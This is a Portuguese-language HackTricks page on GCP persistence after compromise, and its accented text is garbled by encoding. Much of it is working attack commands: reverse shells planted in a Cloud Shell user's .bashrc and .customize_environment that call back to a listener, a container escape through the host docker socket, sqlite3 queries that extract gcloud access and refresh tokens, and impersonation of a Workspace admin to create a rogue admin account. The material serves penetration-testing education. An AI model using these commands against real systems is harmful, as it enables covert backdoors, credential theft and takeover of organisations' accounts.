# GCP - Persist√™ncia N√£o-svc

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Participe do grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou do grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Estas s√£o t√©cnicas √∫teis uma vez que, de alguma forma, voc√™ tenha comprometido algumas credenciais do GCP ou m√°quina rodando em um ambiente GCP.

## Google‚Äôs Cloud Shell <a href="#e5eb" id="e5eb"></a>

### Backdoor Persistente

O [**Google Cloud Shell**](https://cloud.google.com/shell/) oferece acesso via linha de comando aos seus recursos na nuvem diretamente do seu navegador sem custo associado.

Voc√™ pode acessar o Cloud Shell do Google a partir do **console web** ou executando **`gcloud cloud-shell ssh`**.

Este console tem algumas capacidades interessantes para atacantes:

1. **Qualquer usu√°rio do Google com acesso ao Google Cloud** tem acesso a uma inst√¢ncia do Cloud Shell totalmente autenticada.
2. A referida inst√¢ncia **manter√° seu diret√≥rio home por pelo menos 120 dias** se nenhuma atividade ocorrer.
3. N√£o h√° **capacidades para uma organiza√ß√£o monitorar** a atividade dessa inst√¢ncia.

Isso basicamente significa que um atacante pode colocar um backdoor no diret√≥rio home do usu√°rio e, contanto que o usu√°rio se conecte ao GC Shell a cada 120 dias pelo menos, o backdoor sobreviver√° e o atacante obter√° um shell toda vez que for executado apenas fazendo:
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
Existe outro arquivo na pasta home chamado **`.customize_environment`** que, se existir, ser√° **executado toda vez** que o usu√°rio acessar o **cloud shell** (como na t√©cnica anterior). Basta inserir o backdoor anterior ou um semelhante ao seguinte para manter a persist√™ncia enquanto o usu√°rio usar "frequentemente" o cloud shell:
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
Observe que **a primeira vez que uma a√ß√£o √© realizada no Cloud Shell que requer autentica√ß√£o**, ela **abre** uma janela de autoriza√ß√£o no navegador do usu√°rio que deve ser aceita antes que o comando seja executado. Se um pop-up inesperado aparecer, o alvo pode ficar desconfiado e comprometer o m√©todo de persist√™ncia.
{% endhint %}

### Fuga do Container do Google Cloud Shell

Note que o Google Cloud Shell √© executado dentro de um container, voc√™ pode **escapar facilmente para o host** fazendo:
```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```
Este n√£o √© considerado uma vulnerabilidade pelo Google, mas oferece uma vis√£o mais ampla do que est√° acontecendo nesse ambiente.

Al√©m disso, observe que a partir do host voc√™ pode encontrar um token de conta de servi√ßo:
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```
Com os seguintes escopos:
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```
## Sequestro de Token

### Usu√°rio Autenticado

Se voc√™ conseguir acessar a pasta pessoal de um **usu√°rio autenticado no GCP**, por **padr√£o**, voc√™ poder√° **obter tokens para esse usu√°rio pelo tempo que quiser** sem precisar se autenticar e independentemente da m√°quina que voc√™ usar os tokens dele e mesmo que o usu√°rio tenha MFA configurado.

Isso ocorre porque por padr√£o voc√™ **poder√° usar o token de atualiza√ß√£o pelo tempo que desejar** para gerar novos tokens.

Para obter o token atual de um usu√°rio, voc√™ pode executar:

{% code overflow="wrap" %}
```bash
sqlite3 ./.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
```
gcloud auth print-access-token
```
{% endcode %}

Para obter os detalhes para gerar um novo token de acesso, execute:

{% code overflow="wrap" %}
```
gcloud auth print-access-token
```
{% endcode %}
```bash
sqlite3 ./.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
```
gcloud auth print-access-token --client-id="YOUR_CLIENT_ID" --client-secret="YOUR_CLIENT_SECRET" --refresh-token="YOUR_REFRESH_TOKEN"
```
{% endcode %}

Para obter um novo token de acesso atualizado com o token de atualiza√ß√£o, ID do cliente e segredo do cliente, execute:

{% code overflow="wrap" %}
```
gcloud auth print-access-token --client-id="YOUR_CLIENT_ID" --client-secret="YOUR_CLIENT_SECRET" --refresh-token="YOUR_REFRESH_TOKEN"
```
{% endcode %}
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
{% endcode %}

### Contas de Servi√ßo

Assim como com usu√°rios autenticados, se voc√™ conseguir **comprometer o arquivo de chave privada** de uma conta de servi√ßo, voc√™ poder√° **acess√°-la geralmente pelo tempo que quiser**.\
No entanto, se voc√™ roubar o **token OAuth** de uma conta de servi√ßo, isso pode ser ainda mais interessante, porque, mesmo que por padr√£o esses tokens sejam √∫teis apenas por uma hora, se a **v√≠tima deletar a chave privada da API, o token OAuth ainda ser√° v√°lido at√© que expire**.

### Metadados

Obviamente, enquanto voc√™ estiver dentro de uma m√°quina executando no ambiente GCP, voc√™ poder√° **acessar a conta de servi√ßo associada a essa m√°quina contatando o endpoint de metadados** (note que os tokens OAuth que voc√™ pode acessar neste endpoint geralmente s√£o restritos por escopos).

### Remedia√ß√µes

Algumas remedia√ß√µes para essas t√©cnicas s√£o explicadas em [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

## Bypassando escopos de acesso <a href="#bypassing-access-scopes" id="bypassing-access-scopes"></a>

Quando [escopos de acesso](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam) s√£o usados, o token OAuth que √© gerado para a inst√¢ncia de computa√ß√£o (VM) ter√° uma **limita√ß√£o de** [**escopo**](https://oauth.net/2/scope/) **inclu√≠da**. No entanto, voc√™ pode ser capaz de **bypassar** essa limita√ß√£o e explorar as permiss√µes que a conta comprometida possui.

A **melhor maneira de bypassar** essa restri√ß√£o √© ou encontrar **novas credenciais** no host comprometido, encontrar a **chave de servi√ßo para gerar um token OAuth** sem restri√ß√£o ou **pular para uma VM diferente menos restrita**.

**Invadir outra m√°quina**

√â poss√≠vel que exista outra m√°quina no ambiente com escopos de acesso menos restritivos. Se voc√™ puder visualizar a sa√≠da de `gcloud compute instances list --quiet --format=json`, procure por inst√¢ncias com o escopo espec√≠fico que voc√™ deseja ou o escopo **`auth/cloud-platform`** totalmente inclusivo.

Fique tamb√©m de olho em inst√¢ncias que t√™m a conta de servi√ßo padr√£o atribu√≠da (`PROJECT_NUMBER-compute@developer.gserviceaccount.com`).

**Procurar chaves de conta de servi√ßo**

O Google afirma muito claramente [**"Escopos de acesso n√£o s√£o um mecanismo de seguran√ßa... eles n√£o t√™m efeito ao fazer solicita√ß√µes n√£o autenticadas atrav√©s do OAuth"**](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam).

Portanto, se voc√™ **encontrar uma** [**chave de conta de servi√ßo**](https://cloud.google.com/iam/docs/creating-managing-service-account-keys) armazenada na inst√¢ncia, voc√™ pode bypassar a limita√ß√£o. Estas s√£o **chaves privadas RSA** que podem ser usadas para autenticar na API do Google Cloud e **solicitar um novo token OAuth sem limita√ß√µes de escopo**.

Verifique se alguma conta de servi√ßo exportou uma chave em algum momento com:
```bash
for i in $(gcloud iam service-accounts list --format="table[no-heading](email)"); do
echo "Looking for keys for $i:"
gcloud iam service-accounts keys list --iam-account $i
done
```
Estes arquivos **n√£o s√£o armazenados em uma Inst√¢ncia de Computa√ß√£o por padr√£o**, ent√£o voc√™ teria que ter sorte para encontr√°-los. O nome padr√£o para o arquivo √© `[project-id]-[portion-of-key-id].json`. Ent√£o, se o nome do seu projeto for `test-project`, voc√™ pode **procurar no sistema de arquivos por `test-project*.json`** √† procura deste arquivo de chave.

O conte√∫do do arquivo √© mais ou menos assim:
```json
{
"type": "service_account",
"project_id": "[PROJECT-ID]",
"private_key_id": "[KEY-ID]",
"private_key": "-----BEGIN PRIVATE KEY-----\n[PRIVATE-KEY]\n-----END PRIVATE KEY-----\n",
"client_email": "[SERVICE-ACCOUNT-EMAIL]",
"client_id": "[CLIENT-ID]",
"auth_uri": "https://accounts.google.com/o/oauth2/auth",
"token_uri": "https://accounts.google.com/o/oauth2/token",
"auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
"client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/[SERVICE-ACCOUNT-EMAIL]"
}
```
Ou, se **gerados a partir do CLI**, eles ter√£o esta apar√™ncia:
```json
{
"name": "projects/[PROJECT-ID]/serviceAccounts/[SERVICE-ACCOUNT-EMAIL]/keys/[KEY-ID]",
"privateKeyType": "TYPE_GOOGLE_CREDENTIALS_FILE",
"privateKeyData": "[PRIVATE-KEY]",
"validAfterTime": "[DATE]",
"validBeforeTime": "[DATE]",
"keyAlgorithm": "KEY_ALG_RSA_2048"
}
```
Se voc√™ encontrar um desses arquivos, pode instruir o comando **`gcloud` a reautenticar** com esta conta de servi√ßo. Voc√™ pode fazer isso na inst√¢ncia ou em qualquer m√°quina que tenha as ferramentas instaladas.
```bash
gcloud auth activate-service-account --key-file [FILE]
```
Voc√™ agora pode **testar seu novo token OAuth** da seguinte forma:
```bash
TOKEN=`gcloud auth print-access-token`
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN
```
Voc√™ deve ver `https://www.googleapis.com/auth/cloud-platform` listado nos escopos, o que significa que voc√™ **n√£o est√° limitado por nenhum escopo de acesso a n√≠vel de inst√¢ncia**. Agora voc√™ tem pleno poder para usar todas as suas permiss√µes IAM atribu√≠das.

## Espalhando para o Workspace via delega√ß√£o de autoridade em todo o dom√≠nio <a href="#spreading-to-g-suite-via-domain-wide-delegation-of-authority" id="spreading-to-g-suite-via-domain-wide-delegation-of-authority"></a>

[**Workspace**](https://gsuite.google.com) √© a **plataforma de colabora√ß√£o e produtividade** do Google que consiste em coisas como Gmail, Google Calendar, Google Drive, Google Docs, etc.

**Contas de servi√ßo** no GCP podem ser concedidas **direitos para acessar programaticamente dados do usu√°rio** no Workspace, se passando por usu√°rios leg√≠timos. Isso √© conhecido como [delega√ß√£o de dom√≠nio amplo](https://developers.google.com/admin-sdk/reports/v1/guides/delegation). Isso inclui a√ß√µes como **ler** **e-mails** no Gmail, acessar Google Docs e at√© criar novas contas de usu√°rio na organiza√ß√£o do G Suite.

O Workspace possui [sua pr√≥pria API](https://developers.google.com/gsuite/aspects/apis), completamente separada do GCP. As permiss√µes s√£o concedidas ao Workspace e **n√£o h√° nenhuma rela√ß√£o padr√£o entre GCP e Workspace**.

No entanto, √© poss√≠vel **conceder** a uma conta de servi√ßo **permiss√µes** sobre um usu√°rio do Workspace. Se voc√™ tem acesso √† interface Web neste ponto, pode navegar at√© **IAM -> Contas de Servi√ßo** e verificar se alguma das contas tem **"Habilitado" listado na coluna "delega√ß√£o de dom√≠nio amplo"**. A pr√≥pria coluna pode **n√£o aparecer se nenhuma conta estiver habilitada** (voc√™ pode ler os detalhes de cada conta de servi√ßo para confirmar isso). At√© o momento desta escrita, n√£o h√° como fazer isso programaticamente, embora haja um [pedido para esse recurso](https://issuetracker.google.com/issues/116182848) no rastreador de bugs do Google.

Para criar essa rela√ß√£o √© necess√°rio **habilit√°-la no GCP e tamb√©m no Workforce**.

#### Testar acesso ao Workspace

Para testar esse acesso, voc√™ precisar√° das **credenciais da conta de servi√ßo exportadas em formato JSON**. Voc√™ pode ter adquirido essas credenciais em uma etapa anterior, ou pode ter agora o acesso necess√°rio para criar uma chave para uma conta de servi√ßo que voc√™ sabe que tem delega√ß√£o de dom√≠nio amplo habilitada.

Este t√≥pico √© um pouco complicado... sua conta de servi√ßo tem algo chamado "client\_email", que voc√™ pode ver no arquivo de credencial JSON que voc√™ exporta. Provavelmente parece algo como `account-name@project-name.iam.gserviceaccount.com`. Se voc√™ tentar acessar as chamadas da API do Workforce diretamente com esse e-mail, mesmo com a delega√ß√£o habilitada, voc√™ falhar√°. Isso ocorre porque o diret√≥rio do Workforce n√£o incluir√° os endere√ßos de e-mail da conta de servi√ßo do GCP. Em vez disso, para interagir com o Workforce, precisamos realmente nos passar por usu√°rios v√°lidos do Workforce.

O que voc√™ realmente quer fazer √© **se passar por um usu√°rio com acesso administrativo** e, em seguida, usar esse acesso para fazer algo como **redefinir uma senha, desativar a autentica√ß√£o multifator ou apenas criar para si mesmo uma nova conta de administrador**.

O Gitlab criou [este script Python](https://gitlab.com/gitlab-com/gl-security/gl-redteam/gcp\_misc/blob/master/gcp\_delegation.py) que pode fazer duas coisas - listar o diret√≥rio de usu√°rios e criar uma nova conta administrativa. Aqui est√° como voc√™ usaria:
```bash
# Validate access only
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com

# List the directory
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com \
--list

# Create a new admin account
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com \
--account pwned
```
Voc√™ pode tentar este script em uma s√©rie de endere√ßos de e-mail para se passar por **v√°rios** **usu√°rios**. A sa√≠da padr√£o indicar√° se a conta de servi√ßo tem acesso ao Workforce e incluir√° uma **senha aleat√≥ria para a nova conta de administrador** se uma for criada.

Se voc√™ tiver sucesso na cria√ß√£o de uma nova conta de administrador, poder√° fazer login no [console de administra√ß√£o do Google](https://admin.google.com) e ter controle total sobre tudo no G Suite para cada usu√°rio - e-mail, documentos, calend√°rio, etc. Aproveite.

## Refer√™ncias

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
